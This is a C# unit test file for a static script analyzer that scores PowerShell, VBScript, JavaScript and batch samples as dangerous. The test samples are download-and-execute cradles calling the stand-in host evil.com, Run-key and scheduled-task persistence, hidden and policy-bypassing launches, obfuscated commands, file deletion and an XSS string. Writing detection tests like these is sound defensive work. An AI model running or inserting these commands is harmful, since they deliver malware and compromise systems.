using Bulwark.Core.Engine;
using Xunit;

namespace Bulwark.Core.Tests;

/// <summary>
/// <see cref="ScriptAnalyzer"/> 脚本内容静态分析测试。
/// </summary>
public class ScriptAnalyzerTests
{
    [Fact]
    public void PowerShellDangerousCommands_Detected()
    {
        // 测试 PowerShell 危险命令检测
        string script = @"
            $client = New-Object System.Net.WebClient
            $client.DownloadFile('http://evil.com/malware.exe', 'C:\temp\malware.exe')
            Start-Process 'C:\temp\malware.exe'
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到危险命令，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("DownloadFile") || r.Contains("下载"));
        Assert.Contains(reasons, r => r.Contains("Start-Process") || r.Contains("启动进程"));
    }

    [Fact]
    public void PowerShellObfuscation_Detected()
    {
        // 测试 PowerShell 混淆技术检测
        string script = @"
            $code = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABjACAAPQAgACcASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACcA'))
            Invoke-Expression $code
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到混淆技术，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("Base64") || r.Contains("编码"));
        Assert.Contains(reasons, r => r.Contains("Invoke-Expression") || r.Contains("动态执行"));
    }

    [Fact]
    public void PowerShellBypassExecutionPolicy_Detected()
    {
        // 测试绕过执行策略检测
        string script = "powershell -ExecutionPolicy Bypass -File malicious.ps1";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到绕过执行策略，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("ExecutionPolicy") || r.Contains("绕过"));
    }

    [Fact]
    public void PowerShellHiddenWindow_Detected()
    {
        // 测试隐藏窗口检测
        string script = "powershell -WindowStyle Hidden -Command \"Invoke-Expression 'malicious code'\"";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到隐藏窗口，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("Hidden") || r.Contains("隐藏"));
    }

    [Fact]
    public void VbscriptShellObject_Detected()
    {
        // 测试 VBScript Shell 对象检测
        string script = @"
            Set objShell = CreateObject(""WScript.Shell"")
            objShell.Run ""cmd.exe /c malicious.bat""
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.Vbscript);
        
        Assert.True(score > 0, $"应该检测到 Shell 对象，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("WScript.Shell") || r.Contains("Shell"));
    }

    [Fact]
    public void VbscriptNetworkDownload_Detected()
    {
        // 测试 VBScript 网络下载检测
        string script = @"
            Set objXMLHTTP = CreateObject(""MSXML2.XMLHTTP"")
            objXMLHTTP.Open ""GET"", ""http://evil.com/malware.exe"", False
            objXMLHTTP.Send
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.Vbscript);
        
        Assert.True(score > 0, $"应该检测到网络下载，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("XMLHTTP") || r.Contains("网络请求"));
    }

    [Fact]
    public void JavascriptEval_Detected()
    {
        // 测试 JavaScript eval 执行检测
        string script = @"
            var code = ""malicious code here"";
            eval(code);
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.Javascript);
        
        Assert.True(score > 0, $"应该检测到 eval 执行，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("eval") || r.Contains("动态执行"));
    }

    [Fact]
    public void BatchPowerShellInvocation_Detected()
    {
        // 测试批处理调用 PowerShell 检测
        string script = @"@echo off
powershell -ExecutionPolicy Bypass -Command ""Invoke-Expression 'malicious'""
";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.Batch);
        
        Assert.True(score > 0, $"应该检测到 PowerShell 调用，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("PowerShell") || r.Contains("powershell"));
    }

    [Fact]
    public void EncodedCommandExtraction_Works()
    {
        // 测试编码命令提取
        string commandLine = "powershell -EncodedCommand JABjACAAPQAgACcASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACcA";
        
        var (content, type) = ScriptAnalyzer.ExtractScriptFromCommandLine(commandLine);
        
        Assert.NotNull(content);
        Assert.Equal(ScriptType.PowerShell, type);
        Assert.Contains("Invoke-Expression", content);
    }

    [Fact]
    public void NormalScript_LowScore()
    {
        // 测试正常脚本应该得分较低
        string script = @"
            # This is a normal PowerShell script
            Get-Process | Where-Object {$_.CPU -gt 10}
            Write-Host ""Hello World""
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        // 正常脚本得分应该较低
        Assert.True(score < 20, $"正常脚本得分应该较低，实际: {score}");
    }

    [Fact]
    public void EmptyContent_ZeroScore()
    {
        // 测试空内容应该得分为零
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript("", ScriptType.PowerShell);
        
        Assert.Equal(0, score);
        Assert.Empty(reasons);
    }

    [Fact]
    public void NullContent_ZeroScore()
    {
        // 测试 null 内容应该得分为零
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(null, ScriptType.PowerShell);
        
        Assert.Equal(0, score);
        Assert.Empty(reasons);
    }

    [Fact]
    public void MultipleTechniques_HighScore()
    {
        // 测试多种技术组合应该得高分
        string script = @"
            $client = New-Object System.Net.WebClient
            $code = $client.DownloadString('http://evil.com/payload.ps1')
            Invoke-Expression $code
            Start-Process 'cmd.exe' -ArgumentList '/c whoami' -WindowStyle Hidden
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score >= 50, $"多种技术组合应该得高分，实际: {score}");
        Assert.True(reasons.Count >= 3, $"应该有多个检测原因，实际: {reasons.Count}");
    }

    [Fact]
    public void RegistryModification_Detected()
    {
        // 测试注册表修改检测
        string script = @"
            Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Malware' -Value 'C:\malware.exe'
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到注册表修改，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("注册表") || r.Contains("HKLM"));
    }

    [Fact]
    public void ScheduledTaskCreation_Detected()
    {
        // 测试计划任务创建检测
        string script = @"
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\malware.ps1'
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            Register-ScheduledTask -TaskName 'MalwareTask' -Action $action -Trigger $trigger
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到计划任务创建，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("计划任务") || r.Contains("ScheduledTask"));
    }

    [Fact]
    public void CredentialAccess_Detected()
    {
        // 测试凭据访问检测
        string script = @"
            $cred = Get-Credential
            $password = $cred.Password | ConvertFrom-SecureString
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到凭据访问，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("凭据") || r.Contains("Credential") || r.Contains("SecureString"));
    }

    [Fact]
    public void ProcessCreation_Detected()
    {
        // 测试进程创建检测
        string script = @"
            Start-Process -FilePath 'cmd.exe' -ArgumentList '/c whoami' -NoNewWindow
            [System.Diagnostics.Process]::Start('notepad.exe')
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到进程创建，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("进程") || r.Contains("Process"));
    }

    [Fact]
    public void FileOperations_Detected()
    {
        // 测试文件操作检测
        string script = @"
            Remove-Item -Path 'C:\important.log' -Force
            del C:\backup\*.bak
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到文件删除操作，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("删除") || r.Contains("Remove-Item") || r.Contains("del"));
    }

    [Fact]
    public void VbscriptChrConcatenation_Detected()
    {
        // 测试 VBScript 字符拼接混淆检测
        string script = @"
            Dim cmd
            cmd = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
            CreateObject(""WScript.Shell"").Run cmd
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.Vbscript);
        
        Assert.True(score > 0, $"应该检测到字符拼接混淆，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("chr") || r.Contains("字符"));
    }

    [Fact]
    public void JavascriptDocumentWrite_Detected()
    {
        // 测试 JavaScript document.write 检测（可能用于 XSS）
        string script = @"
            var payload = '<script>alert(""xss"")</script>';
            document.write(payload);
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.Javascript);
        
        // 注意：这个测试可能需要根据实际检测逻辑调整
        // 如果 ScriptAnalyzer 不检测 document.write，这个测试可能需要修改
        Assert.True(score >= 0, $"得分应该非负，实际: {score}");
    }

    [Fact]
    public void ScriptTypeDetection_Works()
    {
        // 新语义(降误报):仅当能拿到「真正可分析的脚本体」时才返回脚本类型,
        // 否则一律 Unknown,交由命令行特征/混淆分析器负责,避免把纯命令行误当脚本误判。

        // EncodedCommand 能 Base64 解码 -> 拿到脚本内容,返回 PowerShell。
        // "Write-Output hi" -> UTF-16LE -> "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABoAGkA"
        var encoded = ScriptAnalyzer.ExtractScriptFromCommandLine(
            "powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABoAGkA");
        Assert.Equal(ScriptType.PowerShell, encoded.Type);
        Assert.NotNull(encoded.Content);

        // mshta 内联 javascript: / vbscript: -> 可分析。
        Assert.Equal(ScriptType.Javascript,
            ScriptAnalyzer.ExtractScriptFromCommandLine("mshta javascript:alert(1)").Type);
        Assert.Equal(ScriptType.Javascript,
            ScriptAnalyzer.ExtractScriptFromCommandLine("mshta vbscript:msgbox(1)").Type);

        // 以下场景拿不到脚本体,均返回 Unknown(由命令行特征兜底,避免误报):
        Assert.Equal(ScriptType.Unknown,
            ScriptAnalyzer.ExtractScriptFromCommandLine("powershell -File test.ps1").Type);
        Assert.Equal(ScriptType.Unknown,
            ScriptAnalyzer.ExtractScriptFromCommandLine("cscript test.vbs").Type);
        Assert.Equal(ScriptType.Unknown,
            ScriptAnalyzer.ExtractScriptFromCommandLine("wscript test.js").Type);
        Assert.Equal(ScriptType.Unknown,
            ScriptAnalyzer.ExtractScriptFromCommandLine("cmd /c test.bat").Type);
        Assert.Equal(ScriptType.Unknown,
            ScriptAnalyzer.ExtractScriptFromCommandLine("notepad test.txt").Type);
    }

    [Fact]
    public void LongBase64String_Detected()
    {
        // 测试长 Base64 字符串检测
        string base64 = new string('A', 150) + "=="; // 创建一个长 Base64 字符串
        string script = $"$data = [Convert]::FromBase64String('{base64}')";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到长 Base64 字符串，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("Base64") || r.Contains("编码"));
    }

    [Fact]
    public void IpAddressInScript_Detected()
    {
        // 测试脚本中的 IP 地址检测
        string script = @"
            $client = New-Object System.Net.WebClient
            $client.DownloadFile('http://192.168.1.100/malware.exe', 'C:\temp\malware.exe')
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到 IP 地址，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("IP") || r.Contains("192.168.1.100"));
    }

    [Fact]
    public void UrlInScript_Detected()
    {
        // 测试脚本中的 URL 检测
        string script = @"
            $client = New-Object System.Net.WebClient
            $client.DownloadFile('http://evil.com/malware.exe', 'C:\temp\malware.exe')
        ";
        
        var (score, reasons) = ScriptAnalyzer.AnalyzeScript(script, ScriptType.PowerShell);
        
        Assert.True(score > 0, $"应该检测到 URL，得分: {score}");
        Assert.Contains(reasons, r => r.Contains("URL") || r.Contains("http://"));
    }
}
